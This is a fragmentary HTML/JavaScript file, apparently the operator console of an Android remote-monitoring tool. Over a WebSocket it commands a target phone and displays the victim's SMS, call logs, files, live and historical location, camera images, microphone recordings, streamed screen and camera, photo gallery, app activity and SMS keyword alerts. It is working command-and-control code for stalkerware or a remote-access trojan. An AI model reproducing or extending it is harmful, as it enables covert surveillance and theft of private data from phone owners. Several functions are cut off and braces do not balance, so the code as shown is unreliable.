            height:100vh;
            overflow:hidden;
        }
        #sidebar{

        }
        button{

</head>

            data: msg
        };
        ws.send(JSON.stringify(payload));
        console.log('📤 Signaling sent:', msg.type);
    }

    // ---------- PEER CONNECTION CREATORS ----------
    function createPeerConnection(streamType, onTrackCallback, useMic = false) {
        const pc = new RTCPeerConnection({ iceServers: ICE_SERVERS });

        if (streamType === 'screen') {
            pc.addTransceiver('video', { direction: 'recvonly' });
        } else if (streamType === 'camera') {
            pc.addTransceiver('video', { direction: 'recvonly' });
            if (useMic) {
                pc.addTransceiver('audio', { direction: 'recvonly' });
            }
        } else if (streamType === 'audio') {
            pc.addTransceiver('audio', { direction: 'recvonly' });
        }

        pc.ontrack = onTrackCallback;
        pc.onicecandidate = (e) => {
            if (e.candidate) {
                sendSignalingMessage({
                    type: 'ICE_CANDIDATE',
                    candidate: e.candidate,
                    streamType: streamType
                });
            }
        };
        pc.oniceconnectionstatechange = () => {
            console.log(`${streamType} ICE state:`, pc.iceConnectionState);
            if (pc.iceConnectionState === 'disconnected' || pc.iceConnectionState === 'failed') {
                if (streamType === 'screen') {
                    screenActive = false;
                    document.getElementById('screenBtn').innerText = 'Start Screen';
                    closeScreenModal();
                }
            }
        };
        pc.onconnectionstatechange = () => {
            console.log(`${streamType} connection state:`, pc.connectionState);
        };
        return pc;
    }

    function getPCForType(type) {
        if (type === 'screen') return screenPC;
        if (type === 'camera') return cameraPC;
        if (type === 'audio') return audioPC;
        return null;
    }

    // ---------- HANDLE INCOMING SIGNALING MESSAGES ----------
    function handleSignalingMessage(msg) {
        console.log('Received signaling:', msg);
        if (msg.type === 'ANSWER') {
            const pc = getPCForType(msg.streamType);
            if (pc) {
                const answer = new RTCSessionDescription({ type: 'answer', sdp: msg.sdp });
                pc.setRemoteDescription(answer).catch(e => console.error('Error setting remote description:', e));
            }
        } else if (msg.type === 'ICE_CANDIDATE') {
            const pc = getPCForType(msg.streamType);
            if (pc && msg.candidate) {
                pc.addIceCandidate(new RTCIceCandidate(msg.candidate)).catch(e => console.error('Error adding ICE candidate:', e));
            }
        }
    }

    async function toggleScreen() {

            if (screenPC) {
                screenPC.close();
                screenPC = null;
            }
            document.getElementById('screenBtn').innerText = 'Start Screen';
            screenActive = false;
            closeScreenModal();
            sendSignalingMessage({ type: 'STOP_SCREEN' });
        } else {
            openScreenModal();
            modalVideo.srcObject = null;

            screenPC = createPeerConnection('screen', (e) => {
                modalVideo.srcObject = e.streams[0];
                console.log('ontrack for screen', e.streams);
            }, false);

            try {
                const offer = await screenPC.createOffer();
                await screenPC.setLocalDescription(offer);
                sendSignalingMessage({
                    type: 'OFFER',
                    sdp: offer.sdp,
                    streamType: 'screen'
                });
                document.getElementById('screenBtn').innerText = 'Stop Screen';
                screenActive = true;
            } catch (e) {

    // ---------- RECORD SCREEN ----------
    let screenMediaRecorder = null;
    let screenRecordedChunks = [];

    function toggleScreenRecording() {
        if (screenMediaRecorder && screenMediaRecorder.state === 'recording') {
            screenMediaRecorder.stop();
            modalRecordBtn.innerText = '🔴';
        } else {
            if (!modalVideo.srcObject) {
                alert('Phone Screen Off');
                return;
            }
            screenRecordedChunks = [];
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            const stream = modalVideo.srcObject;

            if (modalVideo.videoWidth === 0) {
                modalVideo.onloadedmetadata = () => startScreenRecording(canvas, ctx, stream);
            } else {
                startScreenRecording(canvas, ctx, stream);
            }
        }
    }

    function startScreenRecording(canvas, ctx, originalStream) {
        canvas.width = modalVideo.videoWidth;
        canvas.height = modalVideo.videoHeight;

        function drawVideoFrame() {
            ctx.drawImage(modalVideo, 0, 0, canvas.width, canvas.height);
            requestAnimationFrame(drawVideoFrame);
        }
        drawVideoFrame();

        const canvasStream = canvas.captureStream(30);
        originalStream.getAudioTracks().forEach(track => canvasStream.addTrack(track));

        screenMediaRecorder = new MediaRecorder(canvasStream, { mimeType: 'video/webm' });
        screenMediaRecorder.ondataavailable = (e) => screenRecordedChunks.push(e.data);
        screenMediaRecorder.onstop = () => {
            const blob = new Blob(screenRecordedChunks, { type: 'video/webm' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = `screenVideo-${getFormattedDateTime()}.webm`;
            a.click();
            URL.revokeObjectURL(url);
            canvasStream.getTracks().forEach(track => track.stop());
        };
        screenMediaRecorder.start();
        modalRecordBtn.innerText = '🟢';
    }

    // ---------- COMMAND SENDING ----------
    function sendCommand(command, params = {}) {
        if (!ws || ws.readyState !== WebSocket.OPEN) {
            panel.innerHTML = `<div style="color:#d32f2f;">⚠ WebSocket not connected. <a href="#" onclick="manualReconnect()">Reconnect</a>.</div>`;
            return;
        }
        const requestId = 'req_' + Date.now() + '_' + Math.random().toString(36).substr(2, 5);
        const payload = {
            type: 'COMMAND',
            command: command,
            requestId: requestId,
            params: params,
            deviceId: currentDeviceId,
            timestamp: Date.now()
        };
        ws.send(JSON.stringify(payload));
        panel.innerHTML = `<div style="color:#1976ff;">📤 Command sent: ${command}</div>`;
        pendingCommand = command;
        console.log('Sent command:', command, params);
        setTimeout(() => { if (pendingCommand === command) pendingCommand = null; }, 10000);
    }

    // ---------- PLAIN TEXT SENDING ----------
    function sendPlainText(msg) {
        if (!ws || ws.readyState !== WebSocket.OPEN) {
            panel.innerHTML = `<div style="color:#d32f2f;">⚠ WebSocket not connected.</div>`;
            return;
        }
        ws.send(msg);
        panel.innerHTML = `<div style="color:#1976ff;">📤 Plain text sent: ${msg}</div>`;
    }

    // ---------- JSON RESPONSE HANDLER ----------
    function handleJSON(json) {
        console.log('handleJSON:', json.type, json);
        
        if (json.deviceId) {
            currentDeviceId = json.deviceId;
        }
        
        // Handle array responses (from plain text fallback)
        if (Array.isArray(json)) {
            if (pendingCommand === 'GET_SMS') {
                dataType = 'sms';
                currentData = json;
                renderTable();
            } else if (pendingCommand === 'GET_CALL_LOGS') {
                dataType = 'call';
                currentData = json;
                renderTable();
            } else if (pendingCommand === 'LIST_FILES') {
                dataType = 'file';
                currentData = json;
                renderFiles();
            }
            pendingCommand = null;
            return;
        }
        
        // Handle JSON responses by type
        switch (json.type) {
            // Basic responses
            case 'SMS_DATA':
                try {
                    const smsData = typeof json.data === 'string' ? JSON.parse(json.data) : json.data;
                    dataType = 'sms';
                    currentData = Array.isArray(smsData) ? smsData : [];
                    renderTable();
                } catch (e) {
                    console.error('SMS parse error:', e);
                    showNotification('Error parsing SMS data');
                }
                pendingCommand = null;
                break;
                
            case 'CALL_LOGS':
                try {
                    const callData = typeof json.data === 'string' ? JSON.parse(json.data) : json.data;
                    dataType = 'call';
                    currentData = Array.isArray(callData) ? callData : [];
                    renderTable();
                } catch (e) {
                    console.error('Call logs parse error:', e);
                }
                pendingCommand = null;
                break;
                
            case 'FILE_LIST':
                try {
                    const fileData = typeof json.data === 'string' ? JSON.parse(json.data) : json.data;
                    dataType = 'file';
                    currentData = Array.isArray(fileData) ? fileData : [];
                    renderFiles();
                } catch (e) {
                    console.error('File list parse error:', e);
                }
                pendingCommand = null;
                break;
          case 'FILE_INFO':
                // Pre‑allocate array with the exact length
                fileTransfers[json.transferId] = {
                    chunks: new Array(json.totalChunks),
                    totalChunks: json.totalChunks,
                    fileName: json.fileName,
                    fileSize: json.fileSize,
                    path: json.path,
                    received: 0
                };
                // Show progress bar
                document.getElementById('progressFileName').innerText = json.fileName;
                document.getElementById('progressPercent').innerText = '0%';
                document.getElementById('progressBar').style.width = '0%';
                document.getElementById('downloadProgress').style.display = 'block';
                console.log(`📁 Receiving file: ${json.fileName} (${json.totalChunks} chunks)`);
                pendingCommand = null;
                break;
            case 'FILE_CHUNK':
                const transfer = fileTransfers[json.transferId];
                if (!transfer) {
                    console.warn('Unknown transfer ID:', json.transferId);
                    return;
                }
            
                // Defer the heavy decoding and UI update to avoid blocking the event loop
                setTimeout(() => {
                    try {
                        // Decode base64 chunk to binary
                        const binaryString = atob(json.data);
                        const bytes = new Uint8Array(binaryString.length);
                        for (let i = 0; i < binaryString.length; i++) {
                            bytes[i] = binaryString.charCodeAt(i);
                        }
            
                        // Store the decoded chunk
                        transfer.chunks[json.chunkIndex] = bytes;
                        transfer.received++;
            
                        // Update progress bar
                        const percent = Math.round((transfer.received / transfer.totalChunks) * 100);
                        document.getElementById('progressPercent').innerText = percent + '%';
                        document.getElementById('progressBar').style.width = percent + '%';
            
                        // If all chunks received, assemble and download
                        if (transfer.received === transfer.totalChunks) {
                            console.log(`✅ All chunks received for ${transfer.fileName}`);
            
                            // Create a Blob from the array of Uint8Arrays and trigger download
                            const blob = new Blob(transfer.chunks, { type: 'application/octet-stream' });
                            const url = URL.createObjectURL(blob);
                            const a = document.createElement('a');
                            a.href = url;
                            a.download = transfer.fileName;
                            a.click();
                            URL.revokeObjectURL(url);
            
                            // Clean up
                            delete fileTransfers[json.transferId];
                            document.getElementById('downloadProgress').style.display = 'none';
                            showNotification(`✅ Downloaded: ${transfer.fileName}`);
                        }
                    } catch (e) {
                        console.error('Chunk decode error:', e);
                        showNotification('❌ Chunk decode error');
                        delete fileTransfers[json.transferId];
                        document.getElementById('downloadProgress').style.display = 'none';
                    }
                }, 0);
            
                pendingCommand = null;
                break;
                        
            case 'FILE_TRANSFER_STARTED':
                showNotification('File transfer started');
                pendingCommand = null;
                break;
                
            case 'LOCATION_UPDATE':
                // Handle both formats - direct object or nested in data
                const locationData = json.data || json;
                renderMap(locationData);
                pendingCommand = null;
                break;
            case 'CAMERA_IMAGE':
                displayCapturedImage(json.data);
                pendingCommand = null;
                break;
                
            case 'AUDIO_RECORDING':
                showAudio(json.data);
                pendingCommand = null;
                break;
                
            case 'ERROR':
                panel.innerHTML = `<div style="color:#d32f2f;">❌ Error: ${json.error}</div>`;
                pendingCommand = null;
                break;
                
            case 'DEVICE_STATUS':
                setStatus(json.status);
                pendingCommand = null;
                break;
                
            // Flashlight commands
            case 'FLASH_ON':
                flashOn = true;
                document.getElementById('flashBtn').innerText = 'Flash Off';
                showNotification('🔦 Flashlight ON');
                pendingCommand = null;
                break;
                
            case 'FLASH_OFF':

                pendingCommand = null;
                break;
                
            case 'CALL_ALERT':
                handleCallAlert(json);
                pendingCommand = null;
                break;
                
            // Feature 3: Photo Gallery
            case 'RECENT_IMAGES_DATA':
                try {
                    const imgData = typeof json.data === 'string' ? JSON.parse(json.data) : json.data;
                    displayPhotoGallery(imgData);
                } catch (e) {
                    console.error('Images parse error:', e);
                }
                pendingCommand = null;
                break;
                
            case 'IMAGE_DATA':
                try {
                    const imgData = typeof json.data === 'string' ? JSON.parse(json.data) : json.data;
                    if (imgData && imgData.image) showFullImage(imgData.image, imgData.mediaId);
                } catch (e) {
                    console.error('Image data parse error:', e);
                }
                pendingCommand = null;
                break;
                
            // Feature 7: Location History
            case 'LOCATION_HISTORY_DATA':
                try {
                    const locData = typeof json.data === 'string' ? JSON.parse(json.data) : json.data;
                    displayLocationHistory(locData);
                } catch (e) {
                    console.error('Location history parse error:', e);
                }
                pendingCommand = null;
                break;
                
            // Feature 5+6: App Events
            case 'APP_EVENTS_DATA':
                try {
                    const eventsData = typeof json.data === 'string' ? JSON.parse(json.data) : json.data;
                    displayAppEvents(eventsData);
                } catch (e) {
                    console.error('App events parse error:', e);
                }
                pendingCommand = null;
                break;
                
            case 'APP_INSTALLED':
                pushAlert('📱 App Installed', (json.name || json.pkg));
                showNotification('📱 Installed: ' + (json.name || json.pkg));
                pendingCommand = null;
                break;
                
            case 'APP_REMOVED':
                pushAlert('🗑️ App Removed', (json.name || json.pkg));
                showNotification('🗑️ Removed: ' + (json.name || json.pkg));
                pendingCommand = null;
                break;
                
            // Feature 8: SMS Keywords
            case 'SMS_KEYWORDS_SET':
                showNotification('✅ Keywords saved');
                pendingCommand = null;
                break;
                
            case 'SMS_KEYWORDS_DATA':
                try {
                    const kwData = typeof json.data === 'string' ? JSON.parse(json.data) : json.data;
                    displaySmsKeywords(kwData);
                } catch (e) {
                    console.error('Keywords parse error:', e);
                }
                pendingCommand = null;
                break;
                
            case 'SMS_KEYWORDS_CLEARED':
                showNotification('Keywords cleared');
                pendingCommand = null;
                break;
                
            case 'SMS_ALERTS_DATA':
                try {
                    const alertsData = typeof json.data === 'string' ? JSON.parse(json.data) : json.data;
                    displaySmsAlerts(alertsData);
                } catch (e) {
                    console.error('SMS alerts parse error:', e);
                }
                pendingCommand = null;
                break;
                
            case 'SMS_KEYWORD_ALERT':
                pushAlert('🔑 Keyword: ' + json.keyword,
                    'From ' + json.from + ': ' + json.body);
                showNotification('🔑 "' + json.keyword + '" from ' + json.from);
                pendingCommand = null;
                break;
                
            // Device registration
            case 'DEVICE_REGISTRATION':
                currentDeviceId = json.deviceId;
                showNotification('Device registered: ' + (json.name || json.deviceId));
                break;
                
            // Heartbeat
            case 'HEARTBEAT':
                // Ignore
                break;
                
            default:
                console.log('Unhandled JSON type:', json.type);
                break;
        }
    }

    // ---------- PLAIN TEXT HANDLER ----------
    function handlePlainText(msg) {
        console.log('Plain text received:', msg);
        
        if (msg.startsWith("STATUS:")) {
            setStatus(msg.substring(7));
            pendingCommand = null;
            
        } else if (msg.startsWith("LOC_DATA:")) {
            try {
                const data = JSON.parse(msg.substring(9));
                renderMap(data);
                pendingCommand = null;
            } catch (err) { console.error(err); }
        } 
            
     else if (msg.startsWith("SMS_DATA:")) {
            try {
                const data = JSON.parse(msg.substring(9));
                currentData = data;
                dataType = 'sms';
                renderTable();
                pendingCommand = null;
            } catch (err) { console.error(err); }
            
        } else if (msg.startsWith("CALL_DATA:")) {
            try {
                const data = JSON.parse(msg.substring(10));
                currentData = data;
                dataType = 'call';
                renderTable();
                pendingCommand =null;
            } catch (err) { console.error(err); }
            
        } else if (msg.startsWith("CAMERA_IMAGE:")) {
            const base64 = msg.substring(13);
            displayCapturedImage(base64);
            pendingCommand = null;
            
        } else if (msg.startsWith("AUDIO_RECORDING:")) {
            showAudio(msg.substring(16));
            pendingCommand = null;
            
        }  else if (msg.startsWith("FLASH_ON")) {
            // This case may not be used if the device sends JSON, but keep for safety
            flashOn = true;
            document.getElementById('flashBtn').innerText = 'Flash Off';
            showNotification('🔦 Flashlight ON');
            pendingCommand = null;
            
        } else if (msg.startsWith("FLASH_OFF")) {
            flashOn = false;
            document.getElementById('flashBtn').innerText = 'Flash On';
            showNotification('🔦 Flashlight OFF');
            pendingCommand = null;
            
        } else if (msg.startsWith("FLASH_TIMED")) {
            showNotification('⏱️ Flash timed complete');
            pendingCommand = null;
            
        } else if (msg.startsWith("FLASH_BLINK")) {
            showNotification('✨ Flash blink complete');
            pendingCommand = null;
            
        } else if (msg.startsWith("VIBRATE_DONE")) {
            showNotification('Vibration done');
            pendingCommand = null;
            
        } else if (msg.startsWith("ERROR:")) {
            panel.innerHTML = `<div style="color:#d32f2f;">❌ Error: ${msg.substring(6)}</div>`;
            pendingCommand = null;
        } else if (msg.startsWith("I_AM_DEVICE")) {
            console.log('Device identified');
        } else if (msg.startsWith('[') || msg.startsWith('{')) {
            try {
                const parsed = JSON.parse(msg);
                handleJSON(parsed);
            } catch (err) {
                console.error('Failed to parse JSON in plain text:', err);
            }
        } else {
            console.log('Unhandled plain text:', msg);
        }
    }

    // ---------- MESSAGE HANDLER ----------
    function handleIncomingMessage(msg) {
        try {
            const json = JSON.parse(msg);
            if (json.type === 'SIGNALING') {
                handleSignalingMessage(json.data);
            } else {
                handleJSON(json);
            }
        } catch (e) {
            handlePlainText(msg);
        }
    }

    // ---------- WEBSOCKET CONNECTION ----------
    function connectWebSocket() {
        if (ws && (ws.readyState === WebSocket.OPEN || ws.readyState === WebSocket.CONNECTING)) {
            console.log('already connecting/open');
            return;
        }
        if (reconnectTimer) {
            clearTimeout(reconnectTimer);
            reconnectTimer = null;
        }
        setStatus('CONNECTING');
        if (wsDebug) wsDebug.innerText = '🌐 WebSocket: connecting...';
        panel.innerHTML = '⏳ Connecting to server...';

        ws = new WebSocket(WS_URL);
        ws.onopen = () => {
            console.log('WebSocket connected');
            reconnectAttempts = 0;
            ws.send('I_AM_WEB');
            setStatus('ONLINE');
            panel.innerHTML = '✅ Connected to server. Ready.';
            if (wsDebug) wsDebug.innerText = '🌐 WebSocket: ONLINE';
        };
        ws.onmessage = (e) => {
            console.log('RAW message:', e.data.substring(0, 100));
            handleIncomingMessage(e.data);
        };
        ws.onclose = (ev) => {
            console.log('WebSocket closed', ev.reason);
            setStatus('OFFLINE');
            if (wsDebug) wsDebug.innerText = `🌐 WebSocket: closed (${ev.reason})`;
            panel.innerHTML = '🔌 WebSocket disconnected. <a href="#" onclick="manualReconnect()">Reconnect</a>.';
            ws = null;

            const delay = Math.min(1000 * Math.pow(1.5, reconnectAttempts), MAX_RECONNECT_DELAY);
            reconnectAttempts++;
            if (reconnectTimer) clearTimeout(reconnectTimer);
            reconnectTimer = setTimeout(() => {
                console.log('Reconnecting...');
                connectWebSocket();
            }, delay);
        };
        ws.onerror = (err) => {
            console.error('WebSocket error:', err);
            setStatus('ERROR');
            if (wsDebug) wsDebug.innerText = '🌐 WebSocket: error';
        };
    }

    function manualReconnect() {
        if (reconnectTimer) {
            clearTimeout(reconnectTimer);
            reconnectTimer = null;
        }
        if (ws) {
            ws.close();
            ws = null;
        }
        reconnectAttempts = 0;
        connectWebSocket();
    }

    function takeSnapshot() {
        const video = document.getElementById('liveCamVideo');

        }
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;

        canvas.getContext('2d').drawImage(video, 0, 0);
        canvas.toBlob(blob => {

            const a = document.createElement('a');
            a.href = url;
            a.download = `snapshot_${Date.now()}.png`;

    function toggleRecording() {
        const video = document.getElementById('liveCamVideo');
        if (!video || !video.srcObject) {
            alert('No live stream');
            return;
        }
        if (mediaRecorder && mediaRecorder.state === 'recording') {
            mediaRecorder.stop();
            document.getElementById('recordBtn').innerText = 'Record Video';
        } else {
            recordedChunks = [];
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            const stream = video.srcObject;

            if (video.videoWidth === 0) {
                video.onloadedmetadata = () => startCanvasRecording(video, canvas, ctx, stream);
            } else {
                startCanvasRecording(video, canvas, ctx, stream);
            }
        }
    }

    function startCanvasRecording(video, canvas, ctx, originalStream) {
        canvas.width = video.videoHeight;
        canvas.height = video.videoWidth;

        function drawVideoFrame() {
            ctx.save();
            ctx.translate(canvas.width / 2, canvas.height / 2);
            ctx.rotate(90 * Math.PI / 180);
            ctx.drawImage(video, -video.videoWidth / 2, -video.videoHeight / 2,
                         video.videoWidth, video.videoHeight);
            ctx.restore();
            requestAnimationFrame(drawVideoFrame);
        }
        drawVideoFrame();

        const canvasStream = canvas.captureStream(30);
        originalStream.getAudioTracks().forEach(track => canvasStream.addTrack(track));

        mediaRecorder = new MediaRecorder(canvasStream, { mimeType: 'video/webm' });
        mediaRecorder.ondataavailable = (e) => recordedChunks.push(e.data);
        mediaRecorder.onstop = () => {
            const blob = new Blob(recordedChunks, { type: 'video/webm' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = `recording_${Date.now()}.webm`;
            a.click();
            URL.revokeObjectURL(url);
            canvasStream.getTracks().forEach(track => track.stop());
        };
        mediaRecorder.start();
        document.getElementById('recordBtn').innerText = 'Stop Recording';
    }

    function renderMap(loc) {

        if (!loc || (typeof loc.lat === 'undefined' && typeof loc.latitude === 'undefined')) {
            panel.innerHTML = '<p style="color:#d32f2f;">Invalid location data received</p>';
            return;
        }
        
        const lat = loc.lat || loc.latitude;
        const lon = loc.lon || loc.longitude;
        const accuracy = loc.accuracy || 10;
        const provider = loc.provider || 'unknown';
        
        panel.innerHTML = '<div id="map" style="position:relative; height:400px;"></div>';
        const mapDiv = document.getElementById('map');
    
        const infoDiv = document.createElement('div');
        infoDiv.className = 'map-info';
        infoDiv.innerHTML = `
            <div class="coord">📍 ${parseFloat(lat).toFixed(6)}, ${parseFloat(lon).toFixed(6)}</div>
            <div>🎯 Accuracy: ${parseFloat(accuracy).toFixed(1)} m</div>
            <div>📡 Provider: ${provider}</div>
            <div class="addr">🌍 Loading address...</div>
        `;
        mapDiv.appendChild(infoDiv);
    
        if (mapInstance) mapInstance.remove();
        mapInstance = L.map(mapDiv).setView([lat, lon], 18);
        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(mapInstance);
        L.circle([lat, lon], { radius: accuracy, color: '#1976ff' }).addTo(mapInstance);
    
        // Reverse geocoding
        fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`, {
            headers: { 'User-Agent': 'SystemSync-Console/1.0' }
        })
        .then(response => response.json())
        .then(data => {
            const address = data.display_name || 'Address not found';
            infoDiv.querySelector('.addr').innerHTML = `🌍 ${address}`;
        })
        .catch(err => {
            console.error('Geocoding error:', err);
            infoDiv.querySelector('.addr').innerHTML = '🌍 Address unavailable';
        });
}

    function renderTable() {
        if (!currentData || currentData.length === 0) {
            panel.innerHTML = '<p style="color:#999; padding:20px;">No data available</p>';
            return;
        }

        let headers = [], rows = [];
        if (dataType === 'sms') {
            headers = ['Type', 'Number', 'Message', 'Date'];
            rows = currentData.map(item => [
                item.type || (item.type === 1 ? 'Incoming' : 'Outgoing'),
                item.address || item.number || 'Unknown',
                item.body || '',
                item.date || item.timeFmt || ''
            ]);
        } else if (dataType === 'call') {
            headers = ['Type', 'Number', 'Name', 'Date', 'Duration'];
            rows = currentData.map(item => [
                item.type || '',
                item.number || '',
                item.name || '',
                item.date || item.timeFmt || '',
                item.duration ? item.duration + 's' : ''
            ]);
        } else {
            panel.innerHTML = '<p>Unknown data type</p>';
            return;
        }

        const pageSize = 20;
        const totalPages = Math.ceil(rows.length / pageSize);
        const start = currentPage * pageSize;
        const pageRows = rows.slice(start, start + pageSize);

        let html = '<table><thead><tr>';
        headers.forEach(h => html += `<th>${h}</th>`);
        html += '</tr></thead><tbody>';

        pageRows.forEach(r => {
            html += '<tr>';
            r.forEach(cell => html += `<td>${cell || ''}</td>`);
            html += '</tr>';
        });
        html += '</tbody></table>';

        if (totalPages > 1) {
            html += '<div class="pagination">';
            for (let i = 0; i < totalPages; i++) {
                html += `<button class="page-btn" onclick="gotoPage(${i})">${i+1}</button>`;
            }
            html += '</div>';
        }

        panel.innerHTML = html;
    }

    function gotoPage(p) {

    }

    function formatBytes(b) {
        if (b === 0) return '0 B';
        const k = 1024, sizes = ['B','KB','MB','GB'];
        const i = Math.floor(Math.log(b)/Math.log(k));
        return (b/Math.pow(k,i)).toFixed(1) + ' ' + sizes[i];
    }

    function displayAppUsage(data) {
        panel.innerHTML = '';
        if (!Array.isArray(data) || data.length === 0) {
            panel.innerHTML = '<h3>📊 Screen Time</h3><p style="color:#999">No data available. Enable Usage Access in device Settings.</p>';
            return;

        const h3 = document.createElement('h3');
        h3.textContent = '📊 Screen Time (' + data.length + ' apps)';
        panel.appendChild(h3);

        data.forEach(function(app) {
            const totalMs = app.totalTimeMs || 0;
            const hours = Math.floor(totalMs / 3600000);
            const minutes = Math.floor((totalMs % 3600000) / 60000);
            const timeStr = hours > 0 ? `${hours}h ${minutes}m` : `${minutes}m`;
            
            const maxMs = Math.max(...data.map(a => a.totalTimeMs || 0));
            const pct = maxMs > 0 ? Math.round((totalMs / maxMs) * 100) : 0;
            
            const itemDiv = document.createElement('div');
            itemDiv.className = 'app-usage-item';
            itemDiv.innerHTML = `
                <div class="app-usage-name">${app.appName || app.packageName || 'Unknown'}</div>
                <div class="app-usage-time">${timeStr}</div>
                <div style="flex:0.5; margin-left:10px;">
                    <div class="usage-bar" style="width:${pct}%; background-color:${totalMs > 3600000 ? '#d32f2f' : totalMs > 1800000 ? '#ff9800' : '#4caf50'};"></div>
                </div>
            `;
            panel.appendChild(itemDiv);
        });
    }

    function showGeofencePanel() {
        panel.innerHTML = '';
        const h3 = document.createElement('h3'); h3.textContent = '🗺️ Geofence — Safety Zone';
        const desc = document.createElement('p'); desc.style.cssText = 'color:#666;font-size:13px;margin-bottom:12px'; desc.textContent = 'Click the map to set the safe zone centre.';
        const mapDiv = document.createElement('div'); mapDiv.id = 'geofenceMap'; mapDiv.style.cssText = 'width:100%;height:300px;border-radius:10px;margin-bottom:12px';

        const controls = document.createElement('div'); controls.style.cssText = 'display:flex;gap:10px;flex-wrap:wrap;align-items:flex-end';

        function makeInput(labelText, id, type, placeholder, width, value) {
            const wrap = document.createElement('div');
            const lbl = document.createElement('label'); lbl.style.cssText = 'font-size:12px;color:#999'; lbl.textContent = labelText;
            const inp = document.createElement('input'); inp.id = id; inp.type = type; inp.placeholder = placeholder || '';
            inp.style.cssText = 'display:block;padding:6px 10px;border:1px solid #ddd;border-radius:6px;width:' + width;
            if (value !== undefined) inp.value = value;
            wrap.appendChild(lbl); wrap.appendChild(inp); return wrap;
        }

        controls.appendChild(makeInput('Latitude',   'gfLat',    'number', 'e.g. 20.2961', '130px'));
        controls.appendChild(makeInput('Longitude',  'gfLon',    'number', 'e.g. 85.8245', '130px'));
        controls.appendChild(makeInput('Radius (m)', 'gfRadius', 'number', '',             '90px', '500'));

        const btnRow = document.createElement('div'); btnRow.style.cssText = 'display:flex;gap:8px';
        [['Set Fence', '#4caf50', function() { setGeofence(); }],
         ['Clear',     '#d32f2f', function() { sendCommand('CLEAR_GEOFENCE'); }],
         ['Status',    '#1976ff', function() { sendCommand('GET_GEOFENCE'); }]
        ].forEach(function(item) {
            const b = document.createElement('button');
            b.textContent = item[0];
            b.style.cssText = 'padding:8px 16px;background:' + item[1] + ';color:#fff;border:none;border-radius:8px;cursor:pointer';
            b.addEventListener('click', item[2]);
            btnRow.appendChild(b);
        });
        controls.appendChild(btnRow);

        panel.appendChild(h3); panel.appendChild(desc); panel.appendChild(mapDiv); panel.appendChild(controls);

        setTimeout(function() {
            try {
                const gm = L.map('geofenceMap').setView([20.5937, 78.9629], 5);
                L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(gm);
                let mk, ci;
                gm.on('click', function(ev) {
                    document.getElementById('gfLat').value = ev.latlng.lat.toFixed(6);
                    document.getElementById('gfLon').value = ev.latlng.lng.toFixed(6);
                    if (mk) gm.removeLayer(mk);
                    if (ci) gm.removeLayer(ci);
                    mk = L.marker([ev.latlng.lat, ev.latlng.lng]).addTo(gm);
                    const r = parseFloat(document.getElementById('gfRadius').value) || 500;
                    ci = L.circle([ev.latlng.lat, ev.latlng.lng], { radius: r, color: '#1976ff', fillOpacity: 0.15 }).addTo(gm);
                });
            } catch(err) { console.warn('Leaflet:', err); }
        }, 100);
    }

    function setGeofence() {
        const lat = parseFloat(document.getElementById('gfLat').value);
        const lon = parseFloat(document.getElementById('gfLon').value);
        const radius = parseFloat(document.getElementById('gfRadius').value) || 500;
        if (isNaN(lat) || isNaN(lon)) { showNotification('Enter valid coordinates'); return; }
        sendCommand('SET_GEOFENCE', { lat: lat, lon: lon, radius: radius });
    }

    }

function getAppNameFromPkg(pkg) {
    const map = {
        'com.whatsapp': 'WhatsApp',
        'org.telegram.messenger': 'Telegram',
        'com.instagram.android': 'Instagram',
        'com.facebook.orca': 'Messenger',
        'com.facebook.katana': 'Facebook',
        'com.snapchat.android': 'Snapchat',
        'com.twitter.android': 'Twitter',
        'com.viber.voip': 'Viber',
        'com.skype.raider': 'Skype'
    };
    return map[pkg] || pkg;
}

    function filterSocialByPkg(pkg) {

    function showFirebaseSettingsPanel() {
        panel.innerHTML = '';
        const h3 = document.createElement('h3'); h3.textContent = '🔥 Firebase Configuration';
        panel.appendChild(h3);
        const desc = document.createElement('p');
        desc.style.cssText = 'color:#666;font-size:13px;margin-bottom:16px;line-height:1.6';
        desc.innerHTML = 'Enter your Firebase project config.';
        panel.appendChild(desc);
        const fbConf = (typeof firebaseConfig !== 'undefined') ? firebaseConfig : {};
        const fields = [
            ['apiKey','API Key'],['authDomain','Auth Domain'],['projectId','Project ID'],
            ['storageBucket','Storage Bucket'],['messagingSenderId','Sender ID'],['appId','App ID']
        ];
        const form = document.createElement('div');
        form.style.cssText = 'display:flex;flex-direction:column;gap:10px;max-width:480px';
        fields.forEach(function(f) {
            const wrap = document.createElement('div');
            const lbl = document.createElement('label');
            lbl.style.cssText = 'font-size:12px;color:#999;display:block;margin-bottom:3px';
            lbl.textContent = f[1];
            const inp = document.createElement('input'); inp.id = 'fb_'+f[0]; inp.type = 'text';
            inp.value = (fbConf[f[0]] && fbConf[f[0]] !== 'YOUR_API_KEY') ? fbConf[f[0]] : '';
            inp.placeholder = f[1];
            inp.style.cssText = 'width:100%;padding:8px 10px;border:1px solid #ddd;border-radius:6px;font-size:13px;box-sizing:border-box';
            wrap.appendChild(lbl); wrap.appendChild(inp); form.appendChild(wrap);
        });
        const saveBtn = document.createElement('button'); saveBtn.textContent = '💾 Save & Connect';
        saveBtn.style.cssText = 'padding:10px 20px;background:#ff6f00;color:#fff;border:none;border-radius:8px;cursor:pointer;font-size:14px;font-weight:600;margin-top:6px';
        saveBtn.addEventListener('click', function() {
            const newCfg = {};
            fields.forEach(function(f) { newCfg[f[0]] = document.getElementById('fb_'+f[0]).value.trim(); });
            if (!newCfg.projectId) { alert('Enter at least Project ID'); return; }
            localStorage.setItem('fbConfig', JSON.stringify(newCfg));
            alert('Saved! Reload page to apply Firebase config.');
        });
        panel.appendChild(form); panel.appendChild(saveBtn);
        const connected = fbConf.apiKey && fbConf.apiKey !== 'YOUR_API_KEY';
        const status = document.createElement('div');
        status.style.cssText = 'margin-top:16px;padding:12px;background:#f5f5f5;border-radius:8px;font-size:12px';
        status.innerHTML = connected
            ? '<span style="color:#4caf50;font-weight:700">● Firebase Connected</span> — ' + (fbConf.projectId || '')
